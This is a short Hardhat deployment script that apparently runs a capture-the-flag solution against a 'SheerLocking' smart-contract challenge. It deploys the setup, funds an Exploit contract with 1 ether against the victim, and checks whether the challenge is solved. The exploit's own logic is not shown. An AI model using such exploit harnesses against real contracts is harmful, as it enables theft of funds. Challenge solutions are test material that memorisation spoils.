const { parseEther } = require("ethers/lib/utils");

async function main() {
  const SETUP = await ethers.getContractFactory("contracts/JustDravee/Setup.sol:Setup");
  const EXPLOIT = await ethers.getContractFactory("contracts/JustDravee/Exploit.sol:Exploit");

  const setup = await SETUP.deploy();
  const victim = await ethers.getContractAt(
    "SheerLocking",
    await setup.instance()
  );

  console.log("solved:", await setup.isSolved());
  exploit = await EXPLOIT.deploy(victim.address, { value: parseEther("1")});
  console.log("solved:", await setup.isSolved());
}

main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
